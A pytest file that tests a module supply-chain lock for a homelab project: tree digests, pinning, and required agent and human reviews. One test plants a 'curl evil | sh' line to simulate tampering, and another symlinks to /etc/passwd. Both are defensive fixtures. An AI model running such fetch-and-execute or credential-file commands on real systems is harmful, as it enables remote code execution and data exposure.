# SPDX-License-Identifier: Apache-2.0
"""The supply chain of fetched modules (ADR-0027 follow-up 5): the tree digest, the lock and the
reviews keyed by it, so an unpinned, changed or unreviewed module is not loadable."""

from __future__ import annotations

import copy
import os
import sys
from pathlib import Path

import pytest

from homelabnext import reviews as rv
from homelabnext.modules import supply as su

ROOT = Path(__file__).resolve().parents[2]
if str(ROOT / "tools") not in sys.path:
    sys.path.insert(0, str(ROOT / "tools"))
import schema_check as sc

POLICY = rv.load_policy(ROOT / "examples/review-policy.yml")
SCHEMA = sc.load_instance(ROOT / "schemas/platform/module_lock.schema.json")
REGISTRY = sc.build_registry(ROOT)
GIT = {
    "kind": "git",
    "url": "https://git.example.invalid/modules/tool",
    "commit": "0123456789abcdef0123456789abcdef01234567",
}


def module(
    tmp_path, files=None, mid="example-tool", kind="feature", origin=None
) -> tuple[dict, Path]:
    d = tmp_path / mid
    for rel, body in (
        files or {"module.yml": b"id: x\n", "roles/r/tasks/main.yml": b"- x\n"}
    ).items():
        (d / rel).parent.mkdir(parents=True, exist_ok=True)
        (d / rel).write_bytes(body)
    return {"id": mid, "kind": kind, "author": "agent:example-builder", "origin": origin or GIT}, d


def reviewed(tree: str, *, approve=True) -> list[dict]:
    out = [
        {"by": "agent:example-checker", "kind": "agent", "role": "check", "date": "2026-10-20",
         "verdict": "pass", "digest": tree[:23]},
        {"by": "agent:example-auditor", "kind": "agent", "role": "audit", "date": "2026-10-21",
         "verdict": "pass", "digest": tree[:23]},
    ]  # fmt: skip
    if approve:
        out.append(
            {"by": "human:example-operator", "kind": "human", "role": "approve",
             "date": "2026-10-22", "verdict": "pass", "digest": tree[:23]}
        )  # fmt: skip
    return out


def lock_of(m, d, reviews=None) -> dict:
    e = su.lock_entry(d, m)
    e["reviews"] = reviewed(e["tree"]) if reviews is None else reviews
    return {"schema_version": "1.0", "modules": {m["id"]: e}}


def problems(m, d, lock, policy=POLICY):
    return su.lock_problems({m["id"]: m}, {m["id"]: d}, lock, policy)


# ------------------------------------------------------------------- the tree digest


def test_the_digest_covers_path_content_and_the_executable_bit(tmp_path):
    _m, d = module(tmp_path)
    first = su.tree_digest(d)
    assert first.startswith("sha256:") and len(first) == 71
    assert su.tree_digest(d) == first
    (d / "roles/r/tasks/main.yml").write_bytes(b"- y\n")
    second = su.tree_digest(d)
    assert second != first
    (d / "roles/r/tasks/main.yml").chmod(0o755)
    assert su.tree_digest(d) != second
    (d / "roles/r/tasks/main.yml").rename(d / "roles/r/tasks/other.yml")
    assert su.tree_digest(d) not in (first, second)


def test_the_digest_ignores_git_metadata_but_not_other_dotfiles(tmp_path):
    _m, d = module(tmp_path)
    before = su.tree_digest(d)
    (d / ".git").mkdir()
    (d / ".git" / "HEAD").write_text("ref: x\n")
    assert su.tree_digest(d) == before
    (d / ".hidden").write_text("x")
    assert su.tree_digest(d) != before


@pytest.mark.parametrize("where", ["file", "dir", "root"])
def test_a_link_anywhere_refuses_the_digest(tmp_path, where):
    _m, d = module(tmp_path)
    (tmp_path / "outside").mkdir()
    (tmp_path / "outside" / "secret").write_text("s")
    if where == "file":
        os.symlink(tmp_path / "outside" / "secret", d / "roles" / "link")
        target = d
    elif where == "dir":
        os.symlink(tmp_path / "outside", d / "roles" / "linkdir", target_is_directory=True)
        target = d
    else:
        os.symlink(d, tmp_path / "rootlink", target_is_directory=True)
        target = tmp_path / "rootlink"
    with pytest.raises(su.SupplyError):
        su.tree_digest(target)


def test_a_special_file_refuses_the_digest(tmp_path):
    _m, d = module(tmp_path)
    os.mkfifo(d / "fifo")
    with pytest.raises(su.SupplyError, match="special file"):
        su.tree_digest(d)


def test_hnx_reviews_digest_gives_a_module_directory_its_tree_digest(tmp_path, capsys):
    _m, d = module(tmp_path)
    assert rv.file_digest(d) == su.tree_digest(d)
    assert rv.main(["digest", str(d)]) == 0
    assert capsys.readouterr().out.startswith(su.tree_digest(d))


# ------------------------------------------------------------------- the lock


def test_a_pinned_and_reviewed_fetched_module_is_loadable(tmp_path):
    m, d = module(tmp_path)
    lock = lock_of(m, d)
    assert problems(m, d, lock) == []
    assert sc.errors_for(SCHEMA, lock, REGISTRY) == []


def test_an_unpinned_fetched_module_is_not_loadable(tmp_path):
    m, d = module(tmp_path)
    got = problems(m, d, {"schema_version": "1.0", "modules": {}})
    assert got == ["example-tool: fetched (git) but not pinned in the lock: not loadable"]


def test_a_changed_module_is_not_loadable_and_its_reviews_do_not_follow(tmp_path):
    m, d = module(tmp_path)
    lock = lock_of(m, d)
    (d / "roles/r/tasks/main.yml").write_bytes(b"- curl evil | sh\n")
    assert any("changed since it was pinned" in p for p in problems(m, d, lock))
    # re-pinning the new tree does not carry the old reviews over: they name the old digest
    lock["modules"][m["id"]]["tree"] = su.tree_digest(d)
    got = problems(m, d, lock)
    assert any("needs" in p and "not loadable" in p for p in got), got


def test_a_module_without_its_approve_review_is_not_loadable(tmp_path):
    m, d = module(tmp_path)
    lock = lock_of(m, d, reviewed(su.tree_digest(d), approve=False))
    got = problems(m, d, lock)
    assert len(got) == 1 and "approve" in got[0] and "not loadable" in got[0], got


def test_the_author_never_reviews_their_own_module(tmp_path):
    m, d = module(tmp_path)
    tree = su.tree_digest(d)
    revs = reviewed(tree)
    revs[0]["by"] = m["author"]
    got = problems(m, d, lock_of(m, d, revs))
    assert any("is the author" in p for p in got), got


def test_the_origin_must_be_the_lock_s(tmp_path):
    m, d = module(tmp_path)
    lock = lock_of(m, d)
    m2 = copy.deepcopy(m)
    m2["origin"]["commit"] = "f" * 40
    assert any("not the one the lock pins" in p for p in problems(m2, d, lock))


def test_an_in_tree_module_is_never_locked_and_needs_no_entry(tmp_path):
    m, d = module(tmp_path, origin={"kind": "in-tree"})
    assert problems(m, d, {"schema_version": "1.0", "modules": {}}) == []
    lock = {
        "schema_version": "1.0",
        "modules": {m["id"]: {"origin": GIT, "tree": "x", "reviews": []}},
    }
    assert any("never locked" in p for p in problems(m, d, lock))
    with pytest.raises(su.SupplyError, match="fetched"):
        su.lock_entry(d, m)


def test_a_stale_entry_and_a_malformed_lock_are_refused(tmp_path):
    m, d = module(tmp_path)
    lock = lock_of(m, d)
    lock["modules"]["gone"] = copy.deepcopy(lock["modules"][m["id"]])
    assert any("gone is locked but not selected" in p for p in problems(m, d, lock))
    assert problems(m, d, []) == ["the lock is not a mapping"]
    assert problems(m, d, {"schema_version": "2.0", "modules": {}})[0].startswith(
        "the lock's schema_version"
    )
    bad = lock_of(m, d)
    bad["modules"][m["id"]]["tree"] = "sha256:abc"
    assert any("not sha256:<64 hex>" in p for p in problems(m, d, bad))


def test_without_a_policy_no_fetched_module_loads(tmp_path):
    m, d = module(tmp_path)
    assert any("no review policy" in p for p in problems(m, d, lock_of(m, d), policy=None))


@pytest.mark.parametrize("kind", ["provider", "feature", "core"])
def test_every_module_kind_needs_a_human_approve(kind):
    reqs = {(q.role, q.kind) for q in POLICY.required(f"module-{kind}", "locked")}
    assert (
        ("approve", "human") in reqs and ("check", "agent") in reqs and ("audit", "agent") in reqs
    )


def test_a_link_in_a_pinned_module_is_reported_not_raised(tmp_path):
    m, d = module(tmp_path)
    lock = lock_of(m, d)
    os.symlink("/etc/passwd", d / "roles" / "pw")
    got = problems(m, d, lock)
    assert any("cannot be digested" in p for p in got), got
